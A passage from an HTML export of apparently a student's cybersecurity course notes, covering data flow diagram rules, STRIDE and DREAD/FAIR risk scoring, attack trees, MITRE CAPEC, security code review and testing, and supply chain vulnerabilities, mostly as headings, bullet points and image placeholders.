href="Untitled%2043.png"><img style="width:314px" src="Untitled%2043.png"/></a></figure><h3 id="da215f9f-49ed-4f04-9efb-e0b632b4a103" class="">2) Data cannot flow between two datastores</h3><p id="5383e987-3c4c-49aa-a8f7-c8cad04cb3b2" class="">datastore == database || datafile</p><p id="8c8114a9-58d3-4b4b-be37-d99415285dfb" class="">Data flow must be from <mark class="highlight-yellow_background">datastore to a process or a process to a datastore</mark>. </p><p id="1226ce0f-8b37-42ee-bc49-ebfeb5b1e284" class="">Data flow can occur from one data store to many processes.</p><figure id="7831ca0f-213b-4dd9-863d-423ebf0ee3f6" class="image"><a href="Untitled%2044.png"><img style="width:277px" src="Untitled%2044.png"/></a></figure><h3 id="571a119a-5d1d-4fd7-8f5b-ccd9131cc205" class="">3) Data cannot flow directly from an interactor to data store</h3><p id="4f57138a-b8af-4466-8df6-e09f72586036" class="">Data Flow from entity must be processed by a process before going to data store and vice versa.</p><figure id="7edbb7aa-d738-4236-87e7-5ef942f65116" class="image"><a href="Untitled%2045.png"><img style="width:312px" src="Untitled%2045.png"/></a></figure><h3 id="0277f2a2-47a8-4d22-8425-8e49aefed0ad" class="">4) A process must have at least one input data flow and one output data flow</h3><p id="58b021af-c682-49ff-965e-f687b03f1e26" class="">Every process must have input data flow to process the data and an output data flow for the processed data.</p><figure id="40cc00c3-b7a7-40f4-bb80-bacb48865b0f" class="image"><a href="Untitled%2046.png"><img style="width:304px" src="Untitled%2046.png"/></a></figure><h3 id="235a58c6-54ec-4956-ab3a-487f9ef52f5a" class="">5) A data store must have at least one input data flow and one output data flow</h3><p id="a4170f02-504b-4a92-9842-50f5d02f93e3" class="">Every data store must have input data flow to store the data and an output data flow for the retrieved data.</p><figure id="5b025a87-2f09-4d6f-8090-2f69db2596a1" class="image"><a href="Untitled%2047.png"><img style="width:249px" src="Untitled%2047.png"/></a></figure><h3 id="74e8ad2e-849c-4393-8a46-4a9fe73f1ae9" class="">6) Two data flows can not cross each other and all processes must be linked to minimum one data store or any other process/interactor.</h3><p id="bacef51a-c7ff-4545-929e-34f27a849371" class=""><a href="https://www.geeksforgeeks.org/rules-for-data-flow-diagram/">https://www.geeksforgeeks.org/rules-for-data-flow-diagram/</a></p><figure id="67d584f8-03d7-4ffe-81db-5485be1fac6c" class="image"><a href="Untitled%2048.png"><img style="width:225px" src="Untitled%2048.png"/></a></figure><ul id="08547823-d769-499a-8a33-c21940875670" class="toggle"><li><details><summary>USECAS</summary></details></li></ul></details></li></ul></details></li></ul><ul id="97ef39f0-f22d-4a54-b43a-6607575a2fbf" class="toggle"><li><details><summary>The threats</summary><figure id="46db31b6-9f3e-47ea-bd6c-2a31ae93ebaf" class="image"><a href="Untitled%2049.png"><img style="width:623.953125px" src="Untitled%2049.png"/></a></figure></details></li></ul><ul id="4eb8b0c4-61b8-4bb4-8a91-278509569e75" class="toggle"><li><details><summary>STRIDE on register voters example</summary><figure id="f1aeefcc-943f-4752-948d-78cc45ece96c" class="image"><a href="Untitled%2050.png"><img style="width:624px" src="Untitled%2050.png"/></a></figure><figure id="622bf897-2fe2-4531-8e8e-b4cf291577fa" class="image"><a href="Untitled%2051.png"><img style="width:416px" src="Untitled%2051.png"/></a></figure><figure id="c97bc0b0-6dcc-4ff3-9a48-939c64650d4f" class="image"><a href="Untitled%2052.png"><img style="width:652px" src="Untitled%2052.png"/></a></figure><figure id="5c8efca4-2c13-435c-adb3-07e24206832a" class="image"><a href="Untitled%2053.png"><img style="width:621px" src="Untitled%2053.png"/></a></figure></details></li></ul></details></li></ul><ul id="4c2e0022-9b67-4654-8f32-aae2f4bb0157" class="toggle"><li><details><summary>Risk Measurement (DREAD, FAIR)</summary><ul id="2839c9c6-7183-4439-93f1-6e5f439cd4f8" class="toggle"><li><details><summary>Qualitative Risk</summary><ul id="8eae294d-8b4d-44e5-851c-b9f4ec296bbd" class="bulleted-list"><li style="list-style-type:disc">risk is a probablity<ul id="16699a6f-2261-43c2-bd69-9365e0802953" class="bulleted-list"><li style="list-style-type:circle">range: high - low</li></ul><ul id="2f6bf44a-b633-48fb-9a09-0fa75ea211b7" class="bulleted-list"><li style="list-style-type:circle">risk overview ranking the threats causing the risk</li></ul></li></ul><ul id="7495ed86-f4f5-4caa-98de-67a067e9d67f" class="bulleted-list"><li style="list-style-type:disc">inputs<ul id="8bb7da14-6666-48c0-ba48-c3b88c4e857f" class="bulleted-list"><li style="list-style-type:circle">risk type</li></ul><ul id="9a913848-6743-4d51-bb61-5feff224cd39" class="bulleted-list"><li style="list-style-type:circle">likelihood</li></ul><ul id="4d9e29bd-fd31-4e5c-ad70-5eb95a05999e" class="bulleted-list"><li style="list-style-type:circle">possible impact</li></ul></li></ul></details></li></ul><ul id="80bf5927-fd9a-41bf-aa43-65f0d5be97f6" class="toggle"><li><details><summary>DREAD</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="fa451b39-50eb-4a31-92a3-f1222161ca27"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Qualitative risk measurement technique by Microsoft 2003<figure id="b124fbbf-e3b0-43e5-a82a-dd2c274decdb" class="image"><a href="Untitled%2054.png"><img style="width:589.9375px" src="Untitled%2054.png"/></a></figure></div></figure><h3 id="ff3b90f3-27ec-47c3-b0ed-20e191e2755f" class="">Damage Potential</h3><p id="77eada1e-1fab-45f5-9745-93e78ecf19b7" class="">If a threat exploit occurs, evaluate the damage caused</p><p id="844fd7d5-b0c9-4686-9515-90ea21546860" class="">• 0 = Nothing<br/>• 5 = Individual user data compromised<br/>• 10=Complete system or data destruction<br/></p><h3 id="716fd440-587e-4d92-a71d-b924df45ddc3" class="">Reproducibility </h3><p id="bf9d223f-62d1-4634-8483-b132e791dbbb" class="">How easy is it to reproduce the threat exploit?</p><ul id="a315e7ea-01e6-4ab6-9b50-79a7e27c4812" class="bulleted-list"><li style="list-style-type:disc">0 = Very hard or impossible even for administrators/DBAs</li></ul><ul id="57bbcb48-4264-4cf7-bcc0-cdbe6663a187" class="bulleted-list"><li style="list-style-type:disc">5 = One or two steps required, may need an authorized user</li></ul><ul id="ed152cdc-365a-42fd-880e-ab2eda17fe01" class="bulleted-list"><li style="list-style-type:disc">10 = Just a web browser is enough</li></ul><h3 id="3c26b62c-7726-40ca-ba3e-4594def165c5" class="">Exploitability</h3><p id="e6b89f43-2266-4d07-a652-be4b89a6b066" class="">What is needed to exploit this threat?</p><ul id="f421c349-4cbc-41f9-9270-086b7322dc4f" class="bulleted-list"><li style="list-style-type:disc">0 = Advanced programming &amp; networking knowledge<br/>• 5 = Malware exists on the Net, or any tolls available<br/>• 10 = Just a web browser is enough<br/></li></ul><h3 id="0dadc6e0-28fa-447d-82d4-54ac21baca07" class="">Affected Users</h3><p id="d80f25a8-1605-4c12-a581-792a37776e19" class="">How many users are affected?</p><ul id="210e856f-0867-466a-a7c3-88b3bb5943d3" class="bulleted-list"><li style="list-style-type:disc">0 = None<br/>• 5 = Some users, but not all<br/>• 10 = All users<br/></li></ul><h3 id="6770c0ff-2928-4982-87d8-b9320819a094" class="">Discoverability</h3><p id="7cd6a878-c9de-4bcf-a9db-5d65c46d52a9" class="">How easy is it to discover the threat</p><ul id="e3deb3c5-9e93-4426-afed-7ba811275034" class="bulleted-list"><li style="list-style-type:disc">0 = Very hard or impossible; needs source code or admin<br/>access<br/>• 5 = Can figure it out by guessing or monitoring network<br/>traces<br/>• 10 = Information is visible in the web browser or address bar<br/>or in the form or as a hidden variable<br/></li></ul><p id="c0e80e7e-658d-4f12-8b19-3416be4c6473" class="">
</p></details></li></ul><ul id="a71cf22c-255a-4dac-aa28-cbf54547fa34" class="toggle"><li><details><summary>Risk Severity Overall Threat Rating</summary><ul id="7810af49-1f3f-4081-9a32-daeca070b50f" class="bulleted-list"><li style="list-style-type:disc">add all the rankings of each aspect of DREAD all together to get the score</li></ul><figure id="36377ecf-22cf-468c-8ece-e290e29a1b05" class="image"><a href="Untitled%2055.png"><img style="width:623.96875px" src="Untitled%2055.png"/></a></figure></details></li></ul><ul id="3fd11deb-ac3d-4db0-ab03-2bc1bea58a3c" class="toggle"><li><details><summary>DREAD Variations</summary><figure id="ca3bb133-bf0c-4969-bacf-8a6f498f0680" class="image"><a href="Untitled%2056.png"><img style="width:651.96875px" src="Untitled%2056.png"/></a></figure></details></li></ul><ul id="001c5e3a-8dc0-4f6b-b642-f77d84b04d3b" class="toggle"><li><details><summary>Problems with DREAD</summary><figure id="d590ccef-0bcb-4cad-917b-56163042b29b" class="image"><a href="Untitled%2057.png"><img style="width:624px" src="Untitled%2057.png"/></a></figure></details></li></ul><ul id="e0c2b48a-2d03-424f-a41f-b4ed12922982" class="toggle"><li><details><summary>Bug Bar</summary><ul id="5e1b572b-e332-4b7a-a8c1-39f8e426d4f8" class="bulleted-list"><li style="list-style-type:disc">different people from the company get together and share knowledge of what they know</li></ul><ul id="0cdab7df-a7d7-4370-8599-67772ed79046" class="bulleted-list"><li style="list-style-type:disc">allows people with deeper knowledge about a topic to make better DREAD scores</li></ul><ul id="08f3b326-dcab-400b-94d6-92ec37f1df65" class="bulleted-list"><li style="list-style-type:disc">fixes DREAD’s problem</li></ul><figure id="52d791b8-c8ce-4617-bc9b-edb974306837" class="image"><a href="Untitled%2058.png"><img style="width:623.984375px" src="Untitled%2058.png"/></a></figure><p id="78e4bdb0-a88b-4896-a22c-36be81bf0385" class="">
</p></details></li></ul><ul id="96f660c3-1c9b-4644-b908-73ea59e232ed" class="toggle"><li><details><summary>Rankings</summary><figure id="b9567e6c-a3bc-4713-98e5-adab39925e37" class="image"><a href="Untitled%2059.png"><img style="width:623.984375px" src="Untitled%2059.png"/></a></figure></details></li></ul><ul id="78f22500-2b78-4b1d-8d5e-2e3a4be7da63" class="toggle"><li><details><summary>Example: Software Security Bug Bar</summary><h3 id="ba9cad48-5061-435d-98b1-2a557f4a6ac9" class="">Spoofing</h3><p id="62e90ece-501a-48a4-82a4-ca63102b892e" class="">Importaint</p><figure id="974a52ad-864e-4ab4-b0c0-b86127ecbf76" class="image"><a href="Untitled%2060.png"><img style="width:651.984375px" src="Untitled%2060.png"/></a></figure><p id="7ca9e3f0-8fa9-4376-ba43-61902880dd07" class="">low</p><figure id="f0da2fde-ee4d-4e46-8926-2250beb1b75c" class="image"><a href="Untitled%2061.png"><img style="width:651.96875px" src="Untitled%2061.png"/></a></figure><h3 id="2b91b7dd-2def-4d66-bc14-dcc5390f2aee" class="">Data Poisoning</h3><p id="ecf4d645-3841-45de-98ad-0a3a4ca04f8d" class="">important to cirtical</p><figure id="970aecc8-7575-4b7f-becc-b74c2dd4d371" class="image"><a href="Untitled%2062.png"><img style="width:623.96875px" src="Untitled%2062.png"/></a></figure><figure id="613ef316-90f6-4021-a69c-62f454244ce4"><a href="https://learn.microsoft.com/en-us/archive/msdn-magazine/2010/march/security-briefs-add-a-security-bug-bar-to-microsoft-team-foundation-server-2010" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Security Briefs - Add a Security Bug Bar to Microsoft Team Foundation Server 2010</div><div class="bookmark-description">Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.</div></div><div class="bookmark-href"><img src="https://learn.microsoft.com/favicon.ico" class="icon bookmark-icon"/>https://learn.microsoft.com/en-us/archive/msdn-magazine/2010/march/security-briefs-add-a-security-bug-bar-to-microsoft-team-foundation-server-2010</div></div><img src="https://learn.microsoft.com/en-us/media/open-graph-image.png" class="bookmark-image"/></a></figure></details></li></ul><ul id="28260f60-d5f1-4d60-a017-1c9c32c5f5dd" class="toggle"><li><details><summary>Quantitively Risk</summary><figure id="7df73a62-fa40-4ccb-8218-9f66b103c222" class="image"><a href="Untitled%2063.png"><img style="width:623.984375px" src="Untitled%2063.png"/></a></figure></details></li></ul><ul id="f97c8d1d-78a5-47d9-89d9-de2c18bdd01d" class="toggle"><li><details><summary>FAIR</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="fa6cce18-e24c-458a-a729-becb9aabac63"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Quotative risk measurement technique<figure id="58ea29f1-9d5a-40fb-bbd7-0cf93a3d9c28" class="image"><a href="Untitled%2064.png"><img style="width:589.96875px" src="Untitled%2064.png"/></a></figure></div></figure><figure id="ce96a717-c2a0-4cad-9a5c-a8a407f962cb" class="image"><a href="Untitled%2065.png"><img style="width:623.96875px" src="Untitled%2065.png"/></a></figure><figure id="0ee68868-0bac-413c-be88-9fa9ea04ee7f" class="image"><a href="Untitled%2066.png"><img style="width:651.96875px" src="Untitled%2066.png"/></a></figure><figure id="0e07a608-a026-41e2-a32d-7fed92fc331a" class="image"><a href="Untitled%2067.png"><img style="width:2490px" src="Untitled%2067.png"/></a></figure><figure id="75ef4834-bf10-452e-8b81-c2b971f8843b" class="image"><a href="Untitled%2068.png"><img style="width:651.96875px" src="Untitled%2068.png"/></a></figure><figure id="bb23d9cc-6776-46f6-a694-ef9068624893" class="image"><a href="Untitled%2069.png"><img style="width:651.984375px" src="Untitled%2069.png"/></a></figure></details></li></ul><ul id="95e63742-4aed-447d-b660-9944610712d4" class="toggle"><li><details><summary>Cyber insurance</summary></details></li></ul></details></li></ul><ul id="596fcb79-e226-419d-b6e1-f08a7686c545" class="toggle"><li><details><summary>Attack trees, mitigations, libraries</summary><ul id="e279abc1-0ae9-44ee-8c84-caa198887dac" class="toggle"><li><details><summary>Attack Trees</summary><ul id="d94d5d37-8e2d-491e-a071-a57dfe260ca2" class="bulleted-list"><li style="list-style-type:disc">people get together in a room and discuses/share ideas, like brain storming</li></ul><ul id="89a9fc67-00cf-4c75-b225-e2c916652f52" class="bulleted-list"><li style="list-style-type:disc">Conceptual diagram</li></ul><ul id="44d9b046-7d3b-4840-b7ee-e0e4d0816967" class="bulleted-list"><li style="list-style-type:disc">structure an attack into a tree</li></ul><figure id="8df253e4-8c1e-4958-98a2-08ed4c80f0b6" class="image"><a href="Untitled%2070.png"><img style="width:651.984375px" src="Untitled%2070.png"/></a></figure><ul id="2ad6d269-11a2-4ef3-95bd-bd5430b97662" class="bulleted-list"><li style="list-style-type:disc">if “driver doesn’t see object” AND “car fails to brake”, then the root node “car hits object&quot; occurs </li></ul><ul id="8e4df33e-d607-49bf-85e1-50f5e042f0ea" class="bulleted-list"><li style="list-style-type:disc">car fails to brake if “Car is going too fast” OR “brakes are weak”</li></ul><ul id="1abb6e52-96b4-44ab-9903-1ed3d0fead18" class="bulleted-list"><li style="list-style-type:disc">build from the root</li></ul><h3 id="9d716e51-e716-438b-804c-e59143233bef" class="">Why use them?</h3><ul id="2fa39206-ac4e-4f47-9557-b3806e6fd076" class="bulleted-list"><li style="list-style-type:disc">can be used as risk assessment depending on how many steps causes an event/attack<ul id="7ae18e44-6b0a-461c-8a6c-992e991a0e0f" class="bulleted-list"><li style="list-style-type:circle">more events = less risk, less events = higher risk</li></ul></li></ul><ul id="3918ad8a-10c4-4ff9-abb8-c231aa517c21" class="bulleted-list"><li style="list-style-type:disc">Useful discussion tool to enable critiques and overview of methods.</li></ul><h3 id="7bf06a34-2be1-4c2e-94a2-e412211313f3" class="">How to build them</h3><ul id="c5e74cb2-a04f-4084-bfd0-8d97fca5d979" class="bulleted-list"><li style="list-style-type:disc">node = any aspect of an attack</li></ul><ul id="6c87a22d-50c2-4754-8658-0a7a2e682f9c" class="bulleted-list"><li style="list-style-type:disc">branches = dependencies between nodes</li></ul><ul id="ddd67abe-36c6-4311-a00c-6b857dbd7ea8" class="bulleted-list"><li style="list-style-type:disc">start with the objective of the attack</li></ul><figure id="d341a6b2-c053-4517-9629-4e3d49ba0588" class="image"><a href="Untitled%2071.png"><img style="width:623.984375px" src="Untitled%2071.png"/></a></figure><ul id="ec138f35-13c9-4154-b542-21a1f8a308c3" class="bulleted-list"><li style="list-style-type:disc">leaf nodes can find the root causes for an attack and how to mitigate it</li></ul><ul id="19542f5f-de65-4e4c-af08-26595d2154c8" class="bulleted-list"><li style="list-style-type:disc">Identify the core issue.<br/>• Create the root node for the core issue.<br/>• Identify the steps by which the attacker can achieve the core<br/>issue.<br/>• Add these steps as nodes beneath the core issue.<br/>• Repeat the process for each of the nodes you&#x27;ve just added.<br/>• The tree is complete when each branch of the tree ends in a<br/>leaf node (that is, nodes with no steps beneath them).<br/></li></ul><p id="1a5fcd4f-c1c7-41f0-be18-05605fdb0be9" class="">
</p></details></li></ul><ul id="35963888-c490-4585-b997-1de26b127cf0" class="toggle"><li><details><summary>After risk assessment – what next?</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="48ce88a6-ea0f-4e03-9bc7-e50bad305918"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">after ranking which risks are the worst, you look at your resources and pick the ones you’re going to mitagate </div></figure></details></li></ul><ul id="5895415e-4ed1-44b7-be1a-e25e6b57766a" class="toggle"><li><details><summary>MITRE organization</summary><figure id="5208da3b-60af-42a6-a53c-dc33b8838cca" class="image"><a href="Untitled%2072.png"><img style="width:623.96875px" src="Untitled%2072.png"/></a></figure><ul id="d3cbd41e-805b-47ae-ac98-d912d6436e60" class="toggle"><li><details><summary>Common Attack Pattern Enumeration and Classification (CAPEC)</summary><p id="51e7ab21-c83b-4ccb-93f2-545311e1dce5" class="">CAPEC is focused on application security<br/>• Common attributes and techniques employed by<br/>adversaries to exploit weaknesses<br/>– Focus on application security<br/>– Enumerates exploits against vulnerable systems<br/>– Includes social engineering / supply chain<br/>– Associated with Common Weakness Enumeration<br/>(CWE)Attack pattern<br/></p></details></li></ul><ul id="46212241-03bb-4979-8bcf-7d37bcaba6b8" class="toggle"><li><details><summary>Organisation of the library</summary><figure id="254ad9c5-7954-434f-931c-a99c2d26d677" class="image"><a href="Untitled%2073.png"><img style="width:623.984375px" src="Untitled%2073.png"/></a></figure><figure id="2a4bf1b8-121f-4993-949d-9db79452a159" class="image"><a href="Untitled%2074.png"><img style="width:623.984375px" src="Untitled%2074.png"/></a></figure></details></li></ul></details></li></ul></details></li></ul><ul id="73ce4a0f-456b-4c49-8763-7c4a1098d14c" class="toggle"><li><details><summary>Security code reviews and testing</summary><ul id="c1eab8c4-59e5-480b-91be-1fdbd86c238f" class="toggle"><li><details><summary>Security code reviews</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="f283be73-0879-4e3f-a672-437fc2fdbe83"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Security code review is the process of auditing the source code for an application to verify that the proper security controls are present, that they work as intended, and that they have been invoked in all the right places. Code review is a way of ensuring that the application has been developed so as to be “self-defending” in its given environment. OWASP project: <a href="https://www.owasp.org/index.php/Code_Review_Introduction">https://www.owasp.org/index.php/Code_Review_Introduction</a></div></figure><h3 id="b8902a9e-a26e-48c3-9fec-a7d0cc664886" class="">Why perform code reviews?</h3><ul id="ff2e3e9d-5e54-426f-ac96-0385f0b3db17" class="bulleted-list"><li style="list-style-type:disc">easier to check/find security verbalities in the code before you ship it</li></ul><ul id="39be8e6b-ebfa-435e-b95d-97e000cf4c70" class="bulleted-list"><li style="list-style-type:disc">secure software development life cycle</li></ul><figure id="f1be487d-c4e6-4d17-90ea-734d5cab284d" class="image"><a href="Untitled%2075.png"><img style="width:499px" src="Untitled%2075.png"/></a></figure><ul id="b8b8672d-baaa-4c2b-8d88-23f3d4b4dbb0" class="bulleted-list"><li style="list-style-type:disc">uses manual testing, looking at the code</li></ul><ul id="9e883de5-0dfc-4ef7-a90e-a1c04d6b8189" class="bulleted-list"><li style="list-style-type:disc">standard code practices to make the code easier to read during security code testing</li></ul><h3 id="a8282b56-b253-4f91-8e02-1d3c1bb427b2" class="">variations</h3><figure id="377db690-a6c2-41b9-804c-c243546d1070" class="image"><a href="Untitled%2076.png"><img style="width:652px" src="Untitled%2076.png"/></a></figure><h3 id="7a59cf3b-ebff-4e5f-80bf-5a0b794f946a" class="">Standards and checklists</h3><figure id="43d73fa7-6a97-450d-bba4-cd00fd6240df" class="image"><a href="Untitled%2077.png"><img style="width:652px" src="Untitled%2077.png"/></a></figure><figure id="de399712-8773-470e-bc47-58eba1a3230b" class="image"><a href="Untitled%2078.png"><img style="width:623.984375px" src="Untitled%2078.png"/></a></figure><figure id="fc1a00fb-fe87-4747-b58b-5119ae2b9d83" class="image"><a href="Untitled%2079.png"><img style="width:652px" src="Untitled%2079.png"/></a></figure><figure id="007e4228-4465-449d-b01f-afca1054bc87" class="image"><a href="Untitled%2080.png"><img style="width:652px" src="Untitled%2080.png"/></a></figure><h3 id="11bd106c-8aba-4811-ac30-a13093ddc5d6" class="">Success Stories</h3><figure id="cb32d635-aaaa-4689-81e4-9f764dd0331b" class="image"><a href="Untitled%2081.png"><img style="width:623.96875px" src="Untitled%2081.png"/></a></figure></details></li></ul><ul id="23b69263-4e98-428c-8e1a-8392321681a3" class="toggle"><li><details><summary>Security testing.</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="248aa539-5d9c-4126-92e7-e78a64b0a2d2"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">A security test is a method of evaluating<br/>the security of a computer system or<br/>network by methodically validating and<br/>verifying the effectiveness of application<br/>security controls.<br/>OWASP project:<br/><br/><a href="https://www.owasp.org/index.php/Testing:_Introduction_and_objectives">https://www.owasp.org/index.php/Testing:_Introduction_and_objectives</a></div></figure><figure id="4a2eb66c-c160-44df-a8e8-ba58bf5673db" class="image"><a href="Untitled%2082.png"><img style="width:554px" src="Untitled%2082.png"/></a></figure><p id="2af263cd-a942-4031-9722-3cf2b009f540" class="">Why test?</p><ul id="26ccd8fd-1a0c-491d-8ce7-4019d2117b90" class="bulleted-list"><li style="list-style-type:disc">Code never works first time!</li></ul><ul id="8a26cebc-0ab6-4287-bcb4-35321b7457d3" class="bulleted-list"><li style="list-style-type:disc">You must test it to find the bugs!</li></ul><ul id="88885a8f-c0bf-4ff9-be52-752aadc5c8c9" class="bulleted-list"><li style="list-style-type:disc">But, what is a bug?</li></ul><ul id="28a278b0-4a07-494a-8b6e-3dcf4de5916f" class="bulleted-list"><li style="list-style-type:disc">Obvious ones e.g. divide-by-zero</li></ul><ul id="2a03ca5e-2e1b-4be6-82fe-975f0aaed92a" class="bulleted-list"><li style="list-style-type:disc">Subtle failures to meet functional specification</li></ul><ul id="875a4aa6-ac91-431f-9dea-7cb9d32162c3" class="bulleted-list"><li style="list-style-type:disc">Testing only increases confidence in software</li></ul><ul id="dd727acb-7bd3-44d4-a6d6-17230b725c85" class="bulleted-list"><li style="list-style-type:disc">It cannot guarantee there are no bugsnce</li></ul><p id="f2b6bfdd-a643-40b8-9124-2b39f241dd57" class="">How is security testing different?</p><ul id="b5b48d72-eecd-4682-8dd5-2969a76e6c86" class="bulleted-list"><li style="list-style-type:disc">Bugs are caused accidentally</li></ul><ul id="059c60e6-9713-4d8c-97e5-16e886904f14" class="bulleted-list"><li style="list-style-type:disc">Tester needs to think like the attacker</li></ul><ul id="d3d99e14-5d19-4b10-a403-263f3bd5b39a" class="bulleted-list"><li style="list-style-type:disc">So, what is a security bug?</li></ul><p id="54ba559a-f78d-4d72-a659-927470c50a74" class="">How is security testing different?</p><ul id="307965c9-2620-4f38-8958-ade3e65eeab7" class="bulleted-list"><li style="list-style-type:disc">Security bugs are caused deliberately</li></ul><ul id="944cd483-d188-4ed5-b733-198c5e91efb8" class="bulleted-list"><li style="list-style-type:disc">Tester need to think like th attacker</li></ul><ul id="d725bdb0-1df6-49cd-8794-6873058b364e" class="bulleted-list"><li style="list-style-type:disc">So, what is a security bug?</li></ul><ul id="e97e8a7e-96c4-4105-b1b0-17034c13b762" class="bulleted-list"><li style="list-style-type:disc">spoofing another’s identity</li></ul><ul id="603eb959-1d61-47da-8218-f896850991ba" class="bulleted-list"><li style="list-style-type:disc">failed to meet the security requirements</li></ul><ul id="358d19fe-045e-421f-9176-66fa456dbd83" class="bulleted-list"><li style="list-style-type:disc">Testing still just increases confidence in the software</li></ul><ul id="e3cb4f57-3f79-4d75-a024-c7921d15b8b7" class="bulleted-list"><li style="list-style-type:disc">no guarantee that system is secure against motivated attacker</li></ul><p id="c7c2b371-454f-4a46-94d3-9119c44cd00c" class="">Ordinary testing focuses on ...</p><ul id="88f920fa-0ffd-497b-b781-b41816b2bf33" class="bulleted-list"><li style="list-style-type:disc">Happy path</li></ul><ul id="637e41d1-4a78-4ef8-a4d6-e8bfffd830a0" class="bulleted-list"><li style="list-style-type:disc">Unhappy path</li></ul><ul id="c6f6f1e6-6254-4499-8801-45f0bd6eb36f" class="bulleted-list"><li style="list-style-type:disc">is this the same as a security bug?</li></ul><p id="d85e7fb8-e89f-4269-965d-feaae41ca914" class="">No, different because</p><ul id="09d6dfeb-8e8a-4ea8-b3f1-cbd5a2168564" class="bulleted-list"><li style="list-style-type:disc">Paths are about the intended functionality</li></ul><ul id="d3429107-0583-4ce6-b4dc-3053bd133b3a" class="bulleted-list"><li style="list-style-type:disc">Unhappy paths are failures due to errors made by programmer</li></ul><ul id="d1b375e4-8368-4b1d-a00a-efd3aa56a622" class="bulleted-list"><li style="list-style-type:disc">Security bugs are caused deliberately by attacker</li></ul><p id="820fa8a7-f4f0-4373-a601-6d51b86ca80a" class="">Ordinary bugs:</p><ul id="40ea2e86-4fd0-4efc-ad77-49f6caa24784" class="bulleted-list"><li style="list-style-type:disc">focus on failures most likely to occur</li></ul><ul id="20713da7-ff65-4ef4-8c15-dc33864afe8e" class="bulleted-list"><li style="list-style-type:disc">affecting the most users</li></ul><ul id="5b9afce8-e008-42c1-9326-0063152bafa2" class="bulleted-list"><li style="list-style-type:disc">highest return on investment (tester)<br/>Security bugs are:<br/></li></ul><ul id="b7ae47fa-020a-4561-b8b8-3c539472f670" class="bulleted-list"><li style="list-style-type:disc">focus on less likely to occur failures</li></ul><ul id="a3dde833-3b93-496c-81ae-2f412a5dce44" class="bulleted-list"><li style="list-style-type:disc">meeting the attackers goals</li></ul><ul id="b80a1189-8231-4201-81cd-423226d77661" class="bulleted-list"><li style="list-style-type:disc">highest return on investment (attacker)</li></ul><h3 id="7baa53fa-7b9f-48ec-968a-c92805c8905c" class="">Building Security Test Plans</h3><figure id="87a25a35-d298-4a09-9fe6-8ce8bc1d5cc4" class="image"><a href="Untitled%2083.png"><img style="width:652px" src="Untitled%2083.png"/></a></figure></details></li></ul></details></li></ul><ul id="a1258d95-0944-4a4e-93e1-f0d4ffc43d2a" class="toggle"><li><details><summary>Supply Chain Attacks </summary><ul id="bac4da16-0b63-4f99-acc9-43974498b1c3" class="toggle"><li><details><summary>Supply chain vulnerabilities</summary><ul id="c44f1f1f-36e5-4cca-979f-d3c100c5f00d" class="bulleted-list"><li style="list-style-type:disc">your weaknesses are the weaknesses of the dependencies </li></ul><figure id="8a18eb67-d21a-400a-b8f3-5f6681450fe7" class="image"><a href="Untitled%2084.png"><img style="width:2296px" src="Untitled%2084.png"/></a></figure></details></li></ul><ul id="a3fbf007-2c77-4403-9a5c-d29d522a5ca2" class="toggle"><li><details><summary>How supply chain vulnerabilities occur </summary><figure id="bae8aa1c-7479-4411-ba24-4fce8899f1cc" class="image"><a href="Untitled%2085.png"><img style="width:2231px" src="Untitled%2085.png"/></a></figure></details></li></ul><ul id="f747eca9-6e1e-443a-8d95-e3d0d7a20d26" class="toggle"><li><details><summary>Examples</summary><figure id="7d0b9668-f8c7-4092-aaa1-858da48bd20c" class="image"><a href="Untitled%2086.png"><img style="width:652px" src="Untitled%2086.png"/></a></figure><figure id="47c45878-cad4-42b6-9f7c-8e0ecb8809b0" class="image"><a href="Untitled%2087.png"><img style="width:2426px" src="Untitled%2087.png"/></a></figure><figure id="e79b1167-cac7-4cba-97b1-789681ce5155" class="image"><a href="Untitled%2088.png"><img style="width:652px" src="Untitled%2088.png"/></a></figure></details></li></ul><ul id="07711839-a235-419c-94e0-237cbb9c2a25" class="toggle"><li><details><summary>Mitigation</summary><figure id="69a6ec2d-17e3-4eab-aa62-97f8c7ef6e74" class="image"><a href="Untitled%2089.png"><img style="width:2133px" src="Untitled%2089.png"/></a></figure></details></li></ul><ul id="e6646fce-f55b-4087-bf87-3f69055f5a51" class="toggle"><li><details><summary>Projects</summary><figure id="5b04500f-9210-49bd-b0d0-e1bb58106a78" class="image"><a href="Untitled%2090.png"><img style="width:2547px" src="Untitled%2090.png"/></a></figure><figure id="62debb41-7ccc-4875-bd4e-d01424aec9f1" class="image"><a href="Untitled%2091.png"><img style="width:652px" src="Untitled%2091.png"/></a></figure><figure id="a47c51ff-e7ba-4442-990d-2f3f8b70c1ae" class="image"><a href="Untitled%2092.png"><img style="width:2450px" src="Untitled%2092.png"/></a></figure><figure id="573cf783-75a3-453e-a317-b6402e9d3447" class="image"><a href="Untitled%2093.png"><img style="width:623.96875px" src="Untitled%2093.png"/></a></figure></details></li></ul></details></li></ul><ul id="ae60a898-2404-4a93-979d-51bf7e2acf14" class="toggle"><li><details><summary>Set-UID &amp; Privilege Elevation (A)</summary><figure id="9e3cec3a-8ee8-4cd5-ab88-0c519c7b0c32"><a href="https://ecs.wgtn.ac.nz/foswiki/pub/Courses/CYBR271_2024T2/LectureSchedule/CYBR271_06a_SETUID.pdf" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://ecs.wgtn.ac.nz/foswiki/pub/Courses/CYBR271_2024T2/LectureSchedule/CYBR271_06a_SETUID.pdf</div></div></a></figure><ul id="3f0a0b7e-69a8-4330-a8d4-6260bff47910" class="toggle"><li><details><summary>Access Control Mechanisms</summary><figure id="b952781d-b2fe-4004-bb19-5b3fbddde558" class="image"><a href="image.png"><img style="width:652px" src="image.png"/></a></figure><ul 